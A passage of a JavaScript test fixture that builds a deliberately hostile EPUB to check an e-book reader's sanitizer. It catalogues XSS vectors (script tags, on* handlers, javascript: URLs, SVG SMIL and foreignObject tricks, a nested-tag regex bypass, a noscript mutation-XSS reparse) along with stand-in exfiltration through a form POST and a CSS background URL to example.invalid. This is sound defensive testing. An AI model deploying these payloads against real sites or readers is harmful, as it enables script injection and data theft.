      probe +
      ' = 1;</script><circle id="p" r="4"/></svg>',
    'utf-8',
  ).toString('base64') +
  '#p';

const hostileAttacks = `<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>Every Door at Once</title>
<base href="https://example.invalid/base/"/>
<meta http-equiv="refresh" content="0;url=https://example.invalid/redirect"/>
<link rel="stylesheet" type="text/css" href="../styles/main.css"/>
<script src="../scripts/pwn.js"></script>
<script>window.__pwned_inline_script = 1;</script>
</head>
<body onload="window.__pwned_body_onload = 1">
<h1>Every Door at Once</h1>
<p>Nothing on this page is prose. Every line exists to be taken apart.</p>
<p onclick="window.__pwned_onclick = 1">A paragraph that would run script on a click.</p>
<p><span OnMouseOver = "window.__pwned_mixed_case = 1">Mixed case, and a space before the equals sign.</span></p>
<p><a id="js-href" href="javascript:window.__pwned_js_href = 1">A scheme-carrying link.</a></p>
<p><a id="entity-href" href="&#106;&#97;vascript:window.__pwned_entity_href = 1">The same scheme, spelled with character references.</a></p>
<p><img id="onload-image" src="../images/dot.png" alt="dot" onload="window.__pwned_img_onload = 1"/></p>
<p><img id="onerror-image" src="../images/broken.png" alt="broken" onerror="window.__pwned_img_onerror = 1"/></p>
<form id="js-form" action="javascript:window.__pwned_form_action = 1"><input type="text" name="q" value="q"/><button type="submit">Run</button></form>
<form id="remote-form" action="https://example.invalid/collect" method="post"><input type="hidden" name="leak" value="1"/></form>
<iframe id="nested-frame" src="https://example.invalid/frame.html" width="10" height="10"></iframe>
<object id="nested-object" data="https://example.invalid/thing.bin" type="application/octet-stream"><param name="src" value="https://example.invalid/thing.bin"/></object>
<embed id="nested-embed" src="https://example.invalid/thing.svg" type="image/svg+xml"/>
<template id="smuggled"><script>window.__pwned_template_script = 1;</script></template>
<p>END_OF_ATTACKS</p>
</body>
</html>
`;

const hostileSvgAttacks = `<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>The Second Parser</title><link rel="stylesheet" type="text/css" href="../styles/main.css"/></head>
<body>
<h1>The Second Parser</h1>
<p>Everything below is parsed in the SVG namespace, where an HTML-only allowlist has nothing to say.</p>
<svg id="hostile-svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="240" height="170" onload="window.__pwned_svg_onload = 1">
<title>An invented diagram</title>
<script>window.__pwned_svg_script = 1;</script>
<rect x="4" y="4" width="40" height="40" fill="#2b5588">
<set attributeName="onmouseover" to="window.__pwned_smil_set = 1" begin="0s"/>
<animate attributeName="opacity" values="1;1" begin="0s" dur="1s" onbegin="window.__pwned_smil_onbegin = 1"/>
</rect>
<use id="use-href" href="${dataSvg('__pwned_svg_use_href')}"/>
<use id="use-xlink" xlink:href="${dataSvg('__pwned_svg_use_xlink')}"/>
<foreignObject x="60" y="4" width="170" height="44">
<body xmlns="http://www.w3.org/1999/xhtml"><script>window.__pwned_foreign_object = 1;</script><p>Foreign HTML inside SVG.</p></body>
</foreignObject>
<a id="smil-link" href="#hostile-svg"><text x="4" y="110">An animated link</text>
<animate attributeName="href" to="javascript:window.__pwned_smil_animate = 1" begin="0s" dur="2s" fill="freeze"/>
</a>
<a id="xlink-anchor" xlink:href="javascript:window.__pwned_svg_xlink = 1"><text x="4" y="140">A namespaced link</text></a>
</svg>
<p>END_OF_SVG_ATTACKS</p>
</body>
</html>
`;

const hostileSvgDocument = `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="240" height="90" onload="window.__pwned_svg_doc_onload = 1">
<title>A Plate That Bites</title>
<script>window.__pwned_svg_document = 1;</script>
<rect x="2" y="2" width="236" height="86" fill="#eef2f6"/>
<text x="12" y="50">A spine item that is itself an SVG document.</text>
</svg>
`;

// Deliberately not well-formed XML: unclosed elements, an unescaped ampersand
// and unquoted attribute values. Real books ship all three, so the host's
// text/html fallback path is what renders this section.
const hostileMalformed = `<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Books Are Not Well Formed</title></head>
<body>
<h1>Books Are Not Well Formed</h1>
<p>This paragraph is never closed, which is how the XHTML parse fails and the HTML parse takes over.
<p>The ledgers of Smith & Sons were kept in two hands, and neither hand agreed with the other.</p>
<scr<script>ipt>window.__pwned_nested_script = 1;</scr</script>ipt>
<img src=../images/broken.png onerror=window.__pwned_unquoted_attr=1 alt=U>
<noscript><p title="</noscript><img src=x onerror=window.__pwned_mxss_noscript=1>"></noscript>
<ul>
<li>First item, unclosed
<li>Second item, unclosed
</ul>
<p>MALFORMED_TAIL_SENTINEL. This paragraph follows an unclosed paragraph, an unclosed list and a nested tag, and must still be readable.</p>
</body>
</html>
`;

const hostilePreserve = `<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>What Must Survive</title><link rel="stylesheet" type="text/css" href="../styles/main.css"/></head>
<body>
<h1 id="preserve-heading">What Must Survive</h1>
<p class="first"><img class="dropcap" src="../images/dropcap-t.png" alt="T"/>he lamplighter counted the same forty steps every evening, and on the fortieth he looked up.</p>
<span class="x-ebookmaker-pageno"><a id="page_357"></a></span>
<p>One zero-width page anchor sits above this paragraph and another sits <span class="x-ebookmaker-pageno"><a id="page_358"></a></span> inside this sentence. Both are what fragment navigation resolves against.</p>
<a id="chapter-mark"/>
<h2>After the self-closing anchor</h2>
<p>SENTINEL_AFTER_SELF_CLOSING_ANCHOR. An HTML parser ignores the slash on a self-closing anchor, so a careless re-serialization lets the anchor swallow every line below it.</p>
<p>The harbour master kept <em>two</em> ledgers and <strong>never</strong> the same one twice.</p>
<ul>
<li>Salt, in barrels.</li>
<li>Rope, in coils.</li>
<li>Lamp oil, in cans.</li>
</ul>
<blockquote><p>We are paid to remember what the tide forgets.</p></blockquote>
<table>
<thead><tr><th>Ledger</th><th>Entries</th></tr></thead>
<tbody><tr><td>Morning</td><td>41</td></tr><tr><td>Evening</td><td>40</td></tr></tbody>
</table>
<p><a href="#page_357">Back to page 357</a></p>
<p>TAIL_SENTINEL_PRESERVE. If this line is missing, the self-closing anchor swallowed the rest of the section.</p>
</body>
</html>
`;

const hostileResources = `<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>Everything It Must Load</title>
<link id="local-stylesheet" rel="stylesheet" type="text/css" href="../styles/main.css"/>
<link id="cycle-stylesheet" rel="stylesheet" type="text/css" href="../styles/cycle-a.css"/>
<link id="remote-stylesheet" rel="stylesheet" type="text/css" href="https://example.invalid/remote.css"/>
</head>
<body>
<h1>Everything It Must Load</h1>
<p><img id="local-image" src="../images/dot.png" alt="A single dot"/> An image from inside the archive.</p>
<p><img id="remote-image" src="https://example.invalid/pixel.png" alt="A tracking pixel"/> An image from outside it.</p>
<p><img id="declared-missing-image" src="../images/declared-missing.png" alt="D"/>eclared in the manifest, absent from the archive.</p>
<p><img id="undeclared-image" src="../images/undeclared-present.png" alt="U"/>ndeclared in the manifest, present in the archive.</p>
<div id="inline-style-url" style="background-image: url(../images/dot.png); width: 24px; height: 24px;">.</div>
<div id="css-url-image" class="plate">.</div>
<p id="css-remote-background" class="leak">A stylesheet-only exfiltration channel.</p>
<p id="font-face-text" class="stub-face">Text set in the stub face.</p>
<p>END_OF_RESOURCES</p>
</body>
</html>
`;

const hostileScriptedDeclared = `<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Declared Scripted</title></head>
<body>
<h1>Declared Scripted</h1>
<p>This is the only section whose manifest item declares the scripted property. The rendering path must be identical to the sections that carry script without declaring it.</p>
<script>window.__pwned_declared_scripted = 1;</script>
<p>END_OF_SCRIPTED_DECLARED</p>
</body>
</html>
`;

// url("second.css") and url("assets/plate.png") are relative to this stylesheet,
// not to the section that links it. The two directories are siblings, so a host
// that resolves them against the section instead lands nowhere - which is the
// point of writing them in the form real books use.
const hostileMainCss = `@import url("second.css");
@import url(https://example.invalid/x.css);
@font-face { font-family: "Hostile Stub"; src: url("../fonts/stub.woff") format("woff"); }
body { font-family: serif; margin: 1em; }
h1 { font-size: 1.4em; }
.dropcap { float: left; font-size: 3em; line-height: 0.8; padding-right: 0.1em; }
.x-ebookmaker-pageno { font-size: 0; }
.leak { background-image: url(https://example.invalid/?leak=css); }
.stub-face { font-family: "Hostile Stub", serif; }
`;

const hostileSecondCss = `.plate { background-image: url("assets/plate.png"); width: 24px; height: 24px; }
`;

const hostileCycleACss = `@import url("cycle-b.css");
.cycle-a { color: #123456; }
`;

const hostileCycleBCss = `@import url("cycle-a.css");
.cycle-b { color: #654321; }
`;

const hostileNav = `<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
<head><title>A Hostile Little Book</title></head>
<body>
<nav epub:type="toc">
<h1>Contents</h1>
<ol>
<li><a href="text/attacks.xhtml">Every Door at Once</a></li>
<li><a href="text/svg-attacks.xhtml">The Second Parser</a></li>
<li><a href="text/hostile.svg">A Plate That Bites</a></li>
<li><a href="text/malformed.xhtml">Books Are Not Well Formed</a></li>
<li><a href="text/preserve.xhtml">What Must Survive</a></li>
<li><a href="text/resources.xhtml">Everything It Must Load</a></li>
<li><a href="text/scripted-declared.xhtml">Declared Scripted</a></li>
</ol>
</nav>
</body>
</html>
`;

const hostileOpf = `<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="uid" xml:lang="en">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="uid">urn:uuid:5e7c1f20-9a3d-4b8e-8c11-6d4f2a0b7e33</dc:identifier>
    <dc:title>A Hostile Little Book</dc:title>
    <dc:creator>Nobody At All</dc:creator>
    <dc:language>en</dc:language>
    <meta property="dcterms:modified">2026-08-24T00:00:00Z</meta>
  </metadata>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="attacks" href="text/attacks.xhtml" media-type="application/xhtml+xml"/>
    <item id="svg-attacks" href="text/svg-attacks.xhtml" media-type="application/xhtml+xml"/>
    <item id="svg-document" href="text/hostile.svg" media-type="image/svg+xml"/>
    <item id="malformed" href="text/malformed.xhtml" media-type="application/xhtml+xml"/>
    <item id="preserve" href="text/preserve.xhtml" media-type="application/xhtml+xml"/>
    <item id="resources" href="text/resources.xhtml" media-type="application/xhtml+xml"/>
    <item id="scripted-declared" href="text/scripted-declared.xhtml" media-type="application/xhtml+xml" properties="scripted"/>
    <item id="style-main" href="styles/main.css" media-type="text/css"/>
    <item id="style-second" href="styles/second.css" media-type="text/css"/>
    <item id="style-cycle-a" href="styles/cycle-a.css" media-type="text/css"/>
    <item id="style-cycle-b" href="styles/cycle-b.css" media-type="text/css"/>
    <item id="image-dot" href="images/dot.png" media-type="image/png"/>
    <item id="image-broken" href="images/broken.png" media-type="image/png"/>
    <item id="image-dropcap" href="images/dropcap-t.png" media-type="image/png"/>
    <item id="image-declared-missing" href="images/declared-missing.png" media-type="image/png"/>
    <item id="image-plate" href="styles/assets/plate.png" media-type="image/png"/>
    <item id="font-stub" href="fonts/stub.woff" media-type="font/woff"/>
    <item id="script-pwn" href="scripts/pwn.js" media-type="text/javascript"/>
  </manifest>
  <spine>
    <itemref idref="attacks"/>
    <itemref idref="svg-attacks"/>
    <itemref idref="svg-document"/>
    <itemref idref="malformed"/>
    <itemref idref="preserve"/>
    <itemref idref="resources"/>
    <itemref idref="scripted-declared"/>
  </spine>
</package>
`;

const stubWoff = Buffer.concat([
  Buffer.from([0x77, 0x4f, 0x46, 0x46, 0x00, 0x01, 0x00, 0x00]),
  Buffer.from('stub woff payload: the reference must rewrite, the face will not render\n', 'latin1'),
]);

const hostileEntries = [
  mimetypeEntry,
  { name: 'META-INF/container.xml', data: containerXml('OEBPS/content.opf') },
  { name: 'OEBPS/content.opf', data: hostileOpf },
  { name: 'OEBPS/nav.xhtml', data: hostileNav },
  { name: 'OEBPS/text/attacks.xhtml', data: hostileAttacks },
  { name: 'OEBPS/text/svg-attacks.xhtml', data: hostileSvgAttacks },
  { name: 'OEBPS/text/hostile.svg', data: hostileSvgDocument },
  { name: 'OEBPS/text/malformed.xhtml', data: hostileMalformed },
  { name: 'OEBPS/text/preserve.xhtml', data: hostilePreserve },
  { name: 'OEBPS/text/resources.xhtml', data: hostileResources },
  { name: 'OEBPS/text/scripted-declared.xhtml', data: hostileScriptedDeclared },
  { name: 'OEBPS/styles/main.css', data: hostileMainCss },
  { name: 'OEBPS/styles/second.css', data: hostileSecondCss },
  { name: 'OEBPS/styles/cycle-a.css', data: hostileCycleACss },
  { name: 'OEBPS/styles/cycle-b.css', data: hostileCycleBCss },
  { name: 'OEBPS/styles/assets/plate.png', data: makePng(90, 40, 120), method: 0 },
  { name: 'OEBPS/images/dot.png', data: makePng(30, 90, 160), method: 0 },
  { name: 'OEBPS/images/broken.png', data: 'not a PNG, on purpose\n' },
  { name: 'OEBPS/images/undeclared-present.png', data: makePng(200, 190, 20), method: 0 },
  { name: 'OEBPS/fonts/stub.woff', data: stubWoff, method: 0 },
  { name: 'OEBPS/scripts/pwn.js', data: hostileScript },
];

const ATTACKS = 'OEBPS/text/attacks.xhtml';
const SVG_ATTACKS = 'OEBPS/text/svg-attacks.xhtml';
const SVG_DOC = 'OEBPS/text/hostile.svg';
const MALFORMED = 'OEBPS/text/malformed.xhtml';
const PRESERVE = 'OEBPS/text/preserve.xhtml';
const RESOURCES = 'OEBPS/text/resources.xhtml';
const SCRIPTED = 'OEBPS/text/scripted-declared.xhtml';
const MAIN_CSS = 'OEBPS/styles/main.css';
const SECOND_CSS = 'OEBPS/styles/second.css';
const CYCLE_A_CSS = 'OEBPS/styles/cycle-a.css';
const CYCLE_B_CSS = 'OEBPS/styles/cycle-b.css';

function vector({ id, sectionId, source, expectation, probe, selector, description, snippet, note }) {
  return {
    id,
    sectionId,
    source,
    expectation,
    ...(probe === undefined ? {} : { probe }),
    ...(selector === undefined ? {} : { selector }),
    description,
    snippet,
    ...(note === undefined ? {} : { note }),
  };
}

const hostileVectors = [
  vector({
    id: 'base-element',
    sectionId: 'attacks',
    source: ATTACKS,
    expectation: 'removed',
    selector: 'base',
    description: 'A <base> in the head that would re-point every relative reference at a remote origin.',
    snippet: '<base href="https://example.invalid/base/"/>',
  }),
  vector({
    id: 'meta-refresh',
    sectionId: 'attacks',
    source: ATTACKS,
    expectation: 'removed',
    selector: 'meta[http-equiv]',
    description: 'A meta refresh that navigates the frame without script.',
    snippet: '<meta http-equiv="refresh" content="0;url=https://example.invalid/redirect"/>',
  }),
  vector({
    id: 'external-script',
    sectionId: 'attacks',
    source: ATTACKS,
    expectation: 'removed',
    probe: '__pwned_external_script',
    selector: 'script[src]',
    description: 'A <script src> pointing at a JavaScript file that really is in the archive and really is in the manifest, so resolve() would happily hand back bytes for it.',
    snippet: '<script src="../scripts/pwn.js"></script>',
  }),
  vector({
    id: 'inline-script',
    sectionId: 'attacks',
    source: ATTACKS,
    expectation: 'removed',
    probe: '__pwned_inline_script',
    selector: 'script',
    description: 'An inline <script> in the head.',
    snippet: '<script>window.__pwned_inline_script = 1;</script>',
  }),
  vector({
    id: 'body-onload',
    sectionId: 'attacks',
    source: ATTACKS,
    expectation: 'removed',
    probe: '__pwned_body_onload',
    description: 'An on* handler on <body> itself - the attribute a host that copies body attributes across would carry into its own document.',
    snippet: '<body onload="window.__pwned_body_onload = 1">',
  }),
  vector({
    id: 'onclick-handler',
    sectionId: 'attacks',
    source: ATTACKS,
    expectation: 'removed',
    probe: '__pwned_onclick',
    description: 'An onclick handler on a paragraph.',
    snippet: '<p onclick="window.__pwned_onclick = 1">',
  }),
  vector({
    id: 'mixed-case-handler',
    sectionId: 'attacks',
    source: ATTACKS,
    expectation: 'removed',
    probe: '__pwned_mixed_case',
    description: 'An on* handler written OnMouseOver with whitespace before the equals sign. XML preserves attribute case, so a sanitizer testing name.startsWith("on") misses it - and the name lowercases into a live handler the moment the tree is adopted into an HTML document.',
    snippet: '<span OnMouseOver = "window.__pwned_mixed_case = 1">',
  }),
  vector({
    id: 'javascript-href',
    sectionId: 'attacks',
    source: ATTACKS,
    expectation: 'inert',
    probe: '__pwned_js_href',
    selector: '#js-href',
    description: 'A javascript: URL in an href. The anchor may survive; activating it must navigate nowhere and execute nothing.',
    snippet: '<a id="js-href" href="javascript:window.__pwned_js_href = 1">',
  }),
  vector({
    id: 'entity-encoded-javascript-href',
    sectionId: 'attacks',
    source: ATTACKS,
    expectation: 'inert',
    probe: '__pwned_entity_href',
    selector: '#entity-href',
    description: 'The same scheme spelled with numeric character references, which the parser decodes before any attribute-value check sees it.',
    snippet: '<a id="entity-href" href="&#106;&#97;vascript:window.__pwned_entity_href = 1">',
  }),
  vector({
    id: 'img-onload',
    sectionId: 'attacks',
    source: ATTACKS,
    expectation: 'removed',
    probe: '__pwned_img_onload',
    selector: '#onload-image',
    description: 'An onload handler on an image whose source really does resolve and really does load, so the handler fires with no user action if it survives.',
    snippet: '<img id="onload-image" src="../images/dot.png" alt="dot" onload="window.__pwned_img_onload = 1"/>',
  }),
  vector({
    id: 'img-onerror',
    sectionId: 'attacks',
    source: ATTACKS,
    expectation: 'removed',
    probe: '__pwned_img_onerror',
    selector: '#onerror-image',
    description: 'An onerror handler on an image declared image/png whose bytes are not a PNG. It resolves, a blob: URL is built, decoding fails, and the handler fires - the classic that needs no user action.',
    snippet: '<img id="onerror-image" src="../images/broken.png" alt="broken" onerror="window.__pwned_img_onerror = 1"/>',
  }),
  vector({
    id: 'form-javascript-action',
    sectionId: 'attacks',
    source: ATTACKS,
    expectation: 'removed',
    probe: '__pwned_form_action',
    selector: '#js-form',
    description: 'A form whose action is a javascript: URL.',
    snippet: '<form id="js-form" action="javascript:window.__pwned_form_action = 1">',
  }),
  vector({
    id: 'form-remote-action',
    sectionId: 'attacks',
    source: ATTACKS,
    expectation: 'removed',
    selector: '#remote-form',
    description: 'A form that would POST to a remote origin. The sandbox withholds allow-forms, but the element must not survive either.',
    snippet: '<form id="remote-form" action="https://example.invalid/collect" method="post">',
  }),
  vector({
    id: 'iframe-element',
    sectionId: 'attacks',
    source: ATTACKS,
    expectation: 'removed',
    selector: '#nested-frame',
    description: 'A nested iframe pointing at a remote document.',
    snippet: '<iframe id="nested-frame" src="https://example.invalid/frame.html" width="10" height="10"></iframe>',
  }),
  vector({
    id: 'object-element',
    sectionId: 'attacks',
    source: ATTACKS,
    expectation: 'removed',
    selector: '#nested-object',
    description: 'An <object> with a remote data reference and a <param>.',
    snippet: '<object id="nested-object" data="https://example.invalid/thing.bin" type="application/octet-stream"><param name="src" value="https://example.invalid/thing.bin"/></object>',
  }),
  vector({
    id: 'embed-element',
    sectionId: 'attacks',
    source: ATTACKS,
    expectation: 'removed',
    selector: '#nested-embed',
    description: 'An <embed> with a remote source.',
    snippet: '<embed id="nested-embed" src="https://example.invalid/thing.svg" type="image/svg+xml"/>',
  }),

  vector({
    id: 'template-smuggled-script',
    sectionId: 'attacks',
    source: ATTACKS,
    expectation: 'removed',
    probe: '__pwned_template_script',
    selector: '#smuggled',
    description: 'A script inside a <template>. An HTML parse puts it in the template content fragment, which a sanitizer walking element.children never visits, and a serialize-and-reparse hands it straight back.',
    snippet: '<template id="smuggled"><script>window.__pwned_template_script = 1;</script></template>',
    note: 'Inert until something clones the template content, so the assertion is that neither the element nor the script survives - an allowlist that has no entry for <template> gets this for free.',
  }),

  vector({
    id: 'svg-root-onload',
    sectionId: 'svg-attacks',
    source: SVG_ATTACKS,
    expectation: 'removed',
    probe: '__pwned_svg_onload',
    selector: '#hostile-svg',
    description: 'An onload handler on the <svg> root, which fires on its own.',
    snippet: 'onload="window.__pwned_svg_onload = 1"',
  }),
  vector({
    id: 'svg-script',
    sectionId: 'svg-attacks',
    source: SVG_ATTACKS,
    expectation: 'removed',
    probe: '__pwned_svg_script',
    description: 'A <script> in the SVG namespace, which an HTML-only element allowlist never sees.',
    snippet: '<script>window.__pwned_svg_script = 1;</script>',
  }),
  vector({
    id: 'svg-smil-set-handler',
    sectionId: 'svg-attacks',
    source: SVG_ATTACKS,
    expectation: 'removed',
    probe: '__pwned_smil_set',
    description: 'A SMIL <set> that writes an event-handler attribute onto its parent after sanitization has already run over the attributes.',
    snippet: '<set attributeName="onmouseover" to="window.__pwned_smil_set = 1" begin="0s"/>',
  }),
  vector({
    id: 'svg-animate-onbegin',
    sectionId: 'svg-attacks',
    source: SVG_ATTACKS,
    expectation: 'removed',
    probe: '__pwned_smil_onbegin',
    description: 'An onbegin handler on a SMIL <animate>, which fires by itself when the animation starts.',
    snippet: '<animate attributeName="opacity" values="1;1" begin="0s" dur="1s" onbegin="window.__pwned_smil_onbegin = 1"/>',
  }),
  vector({
    id: 'svg-use-data-href',
    sectionId: 'svg-attacks',
    source: SVG_ATTACKS,
    expectation: 'removed',
    probe: '__pwned_svg_use_href',
    selector: '#use-href',
    description: 'A <use> whose href is a data: SVG carrying a script.',
    snippet: '<use id="use-href" href="' + dataSvg('__pwned_svg_use_href') + '"/>',
  }),
  vector({
    id: 'svg-use-data-xlink-href',
    sectionId: 'svg-attacks',
    source: SVG_ATTACKS,
    expectation: 'removed',
    probe: '__pwned_svg_use_xlink',
    selector: '#use-xlink',
    description: 'The same vector spelled with the legacy xlink:href attribute, which a sanitizer that only knows the unprefixed name will leave in place.',
    snippet: '<use id="use-xlink" xlink:href="' + dataSvg('__pwned_svg_use_xlink') + '"/>',
  }),
  vector({
    id: 'svg-foreign-object-script',
    sectionId: 'svg-attacks',
    source: SVG_ATTACKS,
    expectation: 'removed',
    description: 'A <foreignObject> that re-enters the XHTML namespace and carries a script there.',
    probe: '__pwned_foreign_object',
    snippet: '<foreignObject x="60" y="4" width="170" height="44">\n<body xmlns="http://www.w3.org/1999/xhtml"><script>window.__pwned_foreign_object = 1;</script><p>Foreign HTML inside SVG.</p></body>',
  }),
  vector({
    id: 'svg-smil-animate-href',
    sectionId: 'svg-attacks',
    source: SVG_ATTACKS,
    expectation: 'removed',
    probe: '__pwned_smil_animate',
    description: 'A SMIL <animate> that rewrites an anchor href to a javascript: URL after the fact.',
    snippet: '<animate attributeName="href" to="javascript:window.__pwned_smil_animate = 1" begin="0s" dur="2s" fill="freeze"/>',
  }),
  vector({
    id: 'svg-xlink-javascript-href',
    sectionId: 'svg-attacks',
    source: SVG_ATTACKS,
    expectation: 'inert',
    probe: '__pwned_svg_xlink',
    selector: '#xlink-anchor',
    description: 'An SVG anchor whose javascript: URL sits in xlink:href rather than href.',
    snippet: '<a id="xlink-anchor" xlink:href="javascript:window.__pwned_svg_xlink = 1">',
  }),

  vector({
    id: 'svg-document-script',
    sectionId: 'svg-document',
    source: SVG_DOC,
    expectation: 'removed',
    probe: '__pwned_svg_document',
    description: 'A script in a spine item that is itself an image/svg+xml document, so the whole section - not an embedded fragment - is parsed in the SVG namespace.',
    snippet: '<script>window.__pwned_svg_document = 1;</script>',
  }),
  vector({
    id: 'svg-document-onload',
    sectionId: 'svg-document',
    source: SVG_DOC,
    expectation: 'removed',
    probe: '__pwned_svg_doc_onload',
    description: 'An onload handler on the root element of that SVG spine item.',
    snippet: 'onload="window.__pwned_svg_doc_onload = 1"',
  }),

  vector({
    id: 'nested-script-tag',
    sectionId: 'malformed',
    source: MALFORMED,
    expectation: 'removed',
    probe: '__pwned_nested_script',
    description: 'The classic nested-tag construct aimed at regex sanitizers: stripping the inner <script> leaves a working one behind.',
    snippet: '<scr<script>ipt>window.__pwned_nested_script = 1;</scr</script>ipt>',
    note: 'Inert by construction under a real HTML parser, which tokenizes this into an unknown element named scr<script rather than a script. It is here to pin that the host parses instead of pattern-matching; an allowlist must drop the unknown element regardless.',
  }),
  vector({
    id: 'unquoted-onerror',
    sectionId: 'malformed',
    source: MALFORMED,
    expectation: 'removed',
    probe: '__pwned_unquoted_attr',
    description: 'Unquoted attribute values, including an onerror on an image whose bytes are not a PNG. Illegal in XML, ordinary in HTML, and live once the fallback parser accepts it.',
    snippet: '<img src=../images/broken.png onerror=window.__pwned_unquoted_attr=1 alt=U>',
  }),
  vector({
    id: 'mxss-noscript-reparse',
    sectionId: 'malformed',
    source: MALFORMED,
    expectation: 'removed',
    probe: '__pwned_mxss_noscript',
    description: 'Mutation XSS: with scripting enabled the <noscript> body is raw text, so the img sits harmlessly inside a title attribute. Serialize that tree and parse it again in a context where noscript is parsed as markup, and the attribute boundary moves - the img escapes and its onerror is live. The exact shape a parse-sanitize-serialize-into-srcdoc pipeline has to survive.',
    snippet: '<noscript><p title="</noscript><img src=x onerror=window.__pwned_mxss_noscript=1>"></noscript>',
  }),
  vector({
    id: 'unescaped-ampersand',
    sectionId: 'malformed',
    source: MALFORMED,
    expectation: 'preserved',
    description: 'A bare ampersand in text. The XHTML parse must fail and the HTML fallback must render the words, ampersand included.',
    snippet: 'The ledgers of Smith & Sons were kept in two hands',
  }),
  vector({
    id: 'unclosed-paragraph-tail',
    sectionId: 'malformed',
    source: MALFORMED,
    expectation: 'preserved',
    description: 'Content after an unclosed paragraph. MALFORMED_TAIL_SENTINEL must appear in the rendered text.',
    snippet: '<p>MALFORMED_TAIL_SENTINEL.',
  }),
  vector({
    id: 'unclosed-list-items',
    sectionId: 'malformed',
    source: MALFORMED,
    expectation: 'preserved',
    description: 'Two unclosed list items must render as two list items, not one.',
    snippet: '<li>First item, unclosed\n<li>Second item, unclosed',
  }),

  vector({
    id: 'pageno-anchor-span',
    sectionId: 'preserve',
    source: PRESERVE,
    expectation: 'preserved',
    selector: '#page_357',
    description: 'A zero-width page anchor at block level. Sanitizing is not tidying: this is what fragment navigation, and later reading positions, resolve against.',
    snippet: '<span class="x-ebookmaker-pageno"><a id="page_357"></a></span>',
  }),
  vector({
    id: 'pageno-anchor-span-inline',
    sectionId: 'preserve',
    source: PRESERVE,
    expectation: 'preserved',
    selector: '#page_358',
    description: 'The same construct mid-sentence, where an empty-inline cleanup pass is most tempting.',
    snippet: '<span class="x-ebookmaker-pageno"><a id="page_358"></a></span>',
  }),
  vector({
    id: 'pageno-span-styling',
    sectionId: 'preserve',
    source: MAIN_CSS,
    expectation: 'preserved',
    description: 'The publisher rule that makes those page anchors zero-width. It is why they are invisible and why a tidying pass is tempted to drop them.',
    snippet: '.x-ebookmaker-pageno { font-size: 0; }',
  }),
  vector({
    id: 'self-closing-anchor',
    sectionId: 'preserve',
    source: PRESERVE,
    expectation: 'preserved',
    selector: '#chapter-mark',
    description: 'An XHTML self-closing non-void tag. It must come out as an empty <a id="chapter-mark"></a>.',
    snippet: '<a id="chapter-mark"/>',
  }),
  vector({
    id: 'self-closing-anchor-tail',
    sectionId: 'preserve',
    source: PRESERVE,
    expectation: 'preserved',
    description: 'Everything after that anchor. An HTML parser ignores the slash, so a re-serialization that goes through raw markup lets the anchor swallow the remainder; SENTINEL_AFTER_SELF_CLOSING_ANCHOR and TAIL_SENTINEL_PRESERVE must both survive, and neither may end up inside the anchor.',
    snippet: '<p>TAIL_SENTINEL_PRESERVE.',
  }),
  vector({
    id: 'dropcap-alt-substitution',
    sectionId: 'preserve',
    source: PRESERVE,
    expectation: 'preserved',
    description: 'A drop-cap image declared in the manifest but absent from the archive, so resolve() returns undefined. The alt text must be substituted back as a text node - dropping the image silently deletes the first letter of the chapter, which must read "The lamplighter".',
    snippet: '<img class="dropcap" src="../images/dropcap-t.png" alt="T"/>',
  }),
  vector({
    id: 'heading-markup',
    sectionId: 'preserve',
    source: PRESERVE,
    expectation: 'preserved',
    selector: '#preserve-heading',
    description: 'Ordinary headings.',
    snippet: '<h1 id="preserve-heading">What Must Survive</h1>',
  }),
  vector({
    id: 'inline-emphasis',
    sectionId: 'preserve',
    source: PRESERVE,
    expectation: 'preserved',
    description: 'Inline <em> and <strong>.',
    snippet: 'kept <em>two</em> ledgers and <strong>never</strong> the same one twice',
  }),
  vector({
    id: 'list-markup',
    sectionId: 'preserve',
    source: PRESERVE,
    expectation: 'preserved',
    description: 'A well-formed list with three items.',
    snippet: '<li>Salt, in barrels.</li>',
  }),
  vector({
    id: 'blockquote-markup',
    sectionId: 'preserve',
    source: PRESERVE,
    expectation: 'preserved',
    description: 'A blockquote wrapping a paragraph.',
    snippet: '<blockquote><p>We are paid to remember what the tide forgets.</p></blockquote>',
  }),
  vector({
    id: 'table-markup',
    sectionId: 'preserve',
    source: PRESERVE,
    expectation: 'preserved',
    description: 'A table with a head and a body.',
    snippet: '<thead><tr><th>Ledger</th><th>Entries</th></tr></thead>',
  }),
  vector({
    id: 'fragment-link',
    sectionId: 'preserve',
    source: PRESERVE,
    expectation: 'preserved',
    description: 'A same-document fragment link. resolve() returns undefined for it by design, which must not be read as damage.',
    snippet: '<a href="#page_357">Back to page 357</a>',
  }),

  vector({
    id: 'img-local-resource',
    sectionId: 'resources',
    source: RESOURCES,
    expectation: 'preserved',
    selector: '#local-image',
    description: 'An image that resolves inside the archive; its src must become a blob: URL and load.',
    snippet: '<img id="local-image" src="../images/dot.png" alt="A single dot"/>',
  }),
  vector({
    id: 'external-stylesheet',
    sectionId: 'resources',
    source: RESOURCES,
    expectation: 'preserved',
    selector: '#local-stylesheet',
    description: 'A linked stylesheet from inside the archive.',
    snippet: '<link id="local-stylesheet" rel="stylesheet" type="text/css" href="../styles/main.css"/>',
  }),
  vector({
    id: 'css-import-local',
    sectionId: 'resources',
    source: MAIN_CSS,
    expectation: 'preserved',
    description: 'An @import of a second local stylesheet, written the way books write it - relative to the importing stylesheet, not to the section.',
    snippet: '@import url("second.css");',
